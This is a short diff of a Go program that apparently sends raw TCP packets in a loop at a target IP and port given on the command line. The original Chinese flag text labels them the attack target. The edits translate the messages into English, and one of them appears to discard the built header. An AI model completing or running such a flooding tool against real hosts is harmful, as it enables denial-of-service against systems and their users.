@@ -12,24 +12,24 @@ import (
 )
 
 func main() {
-	host := flag.String("h", "", "攻击目标IP")
-	port := flag.Int("p", 0, "攻击目标端口")
+	host := flag.String("h", "", "Target IP")
+	port := flag.Int("p", 0, "Target Port")
 	flag.Parse()
 
 	if *host == "" {
-		fmt.Println("参数 h 不能为空")
+		fmt.Println("parameter h cannot be empty")
 		return
 	}
 
 	if *port == 0 {
-		fmt.Println("参数 p 不能为空")
+		fmt.Println("parameter p cannot be empty")
 		return
 	}
 
 	ipv4Addr := net.ParseIP(*host).To4()
 	//目前没有实现ipv6
 	if ipv4Addr == nil {
-		fmt.Println("参数 h 不是有效的IPv4地址")
+		fmt.Println("parameter h invalid IPv4 address")
 		return
 	}
 
@@ -74,7 +74,7 @@ func handle(ip net.IP, port int) {
 //					Addr: ip,
 				}
 				copy(addr.Addr[:4],ip)
-				fmt.Printf("Sendto %v %v ",ip,port )
+				fmt.Printf("Sendto %v %v \n",ip,port )
 				error := syscall.Sendto(fd, buffs, 0, &addr )
 				if error != nil{
 					fmt.Println("Sendto error ",error )
@@ -144,7 +144,8 @@ func getTcpHeader( srcIp,dstIp net.IP, dstPort int) ([]byte, error) {
 	h.Seq = rand.Intn(1<<32 - 1)
 	h.Win = 2048
 
-	b, _ := h.Marshal()
+	//b, _ := h.Marshal()
+	h.Marshal()
 	
 	
     var (
